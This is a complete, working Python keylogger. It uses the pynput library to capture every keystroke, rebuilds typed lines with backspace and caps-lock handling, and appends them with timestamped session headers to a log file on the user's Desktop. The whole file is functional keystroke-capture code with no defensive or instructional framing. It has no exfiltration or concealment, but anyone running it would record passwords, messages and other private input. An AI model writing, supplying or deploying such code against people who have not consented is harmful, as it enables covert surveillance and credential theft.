#! /usr/bin/env python3

from pynput import keyboard
import argparse
import datetime
import os

# Globals
fullstr = []
wLine = ""
F = '0'
# Directories
home = str(os.path.expanduser('~'))
# Files
lgPath = (home+"/Desktop/key.log")
# End Globals

# Class controls what keys are pressed on the keyboard
class KeyControl:
	"""
	Grabs key and handles it appropriately
	param key : str is the key pressed
	param F : int is used to track whether caps is on (1), or caps is off (0)
	param fullstr : list is the dynamic string being built as a list
	param fullstr2 : str is the final line to be written as a string
	param log : str is the log file to be written
	var keyString : [str] is the key pressed formatted between brackets
	var wLine : str line that is to be written
	"""
	def sort_key(key):
		global F,fullstr,wLine,lgPath
		try:
			# Checks if the key pressed is a non-character key
			if "Key." in str(key):
				keyString = ("["+str(key).upper()[4:]+"]")

				# Appends Enter to fullstr and writes line to log
				if keyString == ("[ENTER]"):
					fullstr.append(keyString+"\n")
					## Creates a string from the keys pressed list
					wLine = ''.join([str(i) for i in fullstr])
					LogControl.writeLine(lgPath, (wLine+"\n"))
					fullstr = []
					wLine = ""
					

				# Appends Space to fullstr	
				elif keyString == ("[SPACE]"):
					fullstr.append(' ')

				# Appends Shift to fullstr
				elif keyString == ("[SHIFT]"):
					pass

				# Handles backspace
				elif keyString == ("[BACKSPACE]"):
					try:
						fullstr.pop(len(fullstr)-1)
					except:
						pass

				# Handles Caps (on/off) and appends to logfile appropriately
				elif keyString == ("[CAPS_LOCK]"):

					# If caps is assumed to be on, append [CAPS_ON] to fullstr
					if F == '0':
						keyString = "[CAPS_ON]"
						fullstr.append(keyString)
						F = '1'

					# If caps is assumed to be off, append [CAPS_OFF] to fullstr
					else:
						keyString = "[CAPS_OFF]"
						fullstr.append(keyString)
						F = '0'

				# If the key isnt logged above or falls within the ASCII spectrum, accept the raw key and append it to fullst
				else:
					fullstr.append(keyString)

			# This captures normal ASCII characters
			else:
				keyString = str(key).strip("'")
				fullstr.append(keyString)
			
		except:
			pass

# Class controls the logs
class LogControl:
	"""
	Checks the directories for validity in the given path
	param path : str is the full path thats being split and tested
	var testPath : str is a temporary path made to be tested and built
	var pathSplit : list is a list with individual paths in them
	"""
	def dirCheck(path):
		# Does not support relative paths.
		testPath = "" 
		pathSplit = path.split("/")

		# The range here assumes the last file in the path given is not a directory
		for i in range(1,(len(pathSplit)-1)):
			testPath = testPath+"/"+pathSplit[i]
			if os.path.isdir(testPath) != True:
				os.mkdir(testPath)

	"""
	Writes a captured line to the file
	param lgPath : str is the full path where the log is kept
	param wLine : str is the line that is to be written
	var logFile : File is the log file being written to
	"""
	def writeLine(lgPath,wLine):
		try:
			logFile = open(lgPath,"a")
			logFile.write(wLine)
		finally:
			logFile.close()

	"""
	Initialize the log file
	param logOP : int is mode of operation for this function
	param lgPath : str is the full path where the log is kept
	var logFile : File is the log file being written to
	"""
	def initializeLog(logOP,lgPath):

		# If logging is being destroyed (-1) then destroy log
		if logOP == -1:
			try:
				logFile = open(lgPath,"a")
			finally:
				logFile.write(str(datetime.datetime.now().strftime("\n[--] Log Destroyed:[%m/%d/%Y]|[%H:%M:%S]\n")))
				logFile.close()

		# If logging is ON/STARTING (1) then write the starting header
		elif logOP == 1:
			try:
				logFile = open(lgPath,"a")
			finally:
				logFile.write(str(datetime.datetime.now().strftime("\n[+] Log Started:[%m/%d/%Y]|[%H:%M:%S]\n\n")))
				logFile.close()

		# If logging is OFF/ENDING (0) then write the ending header
		elif logOP == 0:
			try:
				logFile = open(lgPath,"a")
			finally:
				logFile.write(str(datetime.datetime.now().strftime("[-] Log Stopped:[%m/%d/%Y]|[%H:%M:%S]\n")))
				logFile.close()

		# If logging is BUILDING/CREATE (2) then build the log
		elif logOP == 2:
			try:
				logFile = open(lgPath,"a")
			finally:
				logFile.write(str(datetime.datetime.now().strftime("\n[++] Log Created:[%m/%d/%Y]|[%H:%M:%S]\n")))
				logFile.close()

		# Else, fix the input given to intializeLog
		else:
			print ("Incorrect logIO option given in initializeLog()\nlogIO can only be 1 (start) 0 (stop) -1 (destroy) 2 (build).\n")
			exit(1)
	
## Main Function
def __main__():
	if os.path.exists(lgPath) == True:
		LogControl.initializeLog(1, lgPath)
	else:
		LogControl.initializeLog(2, lgPath)
		LogControl.initializeLog(1, lgPath)
	try:
		#starts listening to the keyboard
		with keyboard.Listener(on_press=KeyControl.sort_key) as l:
			#with each key, run sort
			l.join()
	except:
		print("\nInterrupted in __main__")
		exit(0)
	finally:
		LogControl.initializeLog(0, lgPath)
		exit(0)
	

if __name__=="__main__":
	__main__()
